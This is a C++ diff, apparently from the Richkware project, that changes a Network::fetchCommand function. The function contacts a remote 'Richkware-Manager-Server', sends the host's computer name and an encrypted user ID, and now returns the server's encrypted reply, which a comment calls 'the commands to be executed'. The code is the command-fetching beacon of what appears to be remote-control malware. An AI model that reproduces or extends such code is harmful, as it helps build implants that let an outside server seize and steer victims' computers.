@@ -4,7 +4,6 @@
 
 #include "network.h"
 #include "utils.h"
-#include "storage.h"
 
 Server::Server(std::string encryptionKeyArg) {
     encryptionKey = encryptionKeyArg;
@@ -163,14 +162,14 @@ bool Network::UploadInfoToRMS(const char *serverAddress, const char *port, const
 }
 
 //TODO: funzione di fetch dei comandi (dovrà poter esserre chiamata dal main indipendentemente dall'upload dei dati sul server)
-void
-Network::fetchCommand(const char *serverAddress, const char *port, const char *associatedUser, std::string appName) {
+std::string Network::fetchCommand(const char *serverAddress, const char *port, const char *associatedUser, std::string remainingCommands) {
     Crypto crypto(encryptionKey);
     std::string device = getenv("COMPUTERNAME");
     std::string encAssociatedUser = crypto.Encrypt(associatedUser);
 
     std::string packet = "GET /Richkware-Manager-Server/command?data0=" + device +
                          "&data1=" + encAssociatedUser +
+                         "&data2=" + remainingCommands +
                          " HTTP/1.1\r\n" +
                          "Host: " + serverAddress + "\r\n" +
                          "Connection: close\r\n" +
@@ -207,10 +206,10 @@ Network::fetchCommand(const char *serverAddress, const char *port, const char *a
         std::cout << token << std::endl;
         response.erase(0, pos + delimiter.length());
 
-        SystemStorage storage = SystemStorage(appName);
-        storage.SaveValueToFile("commands.richk", response);
+        return response;        //returns an encrypted string containing the commands to be executed
     } else {
         //TODO: manage KO from server
+        return "";
     }
 
 //    std::vector<std::string> commands = utils::split(response, "##");
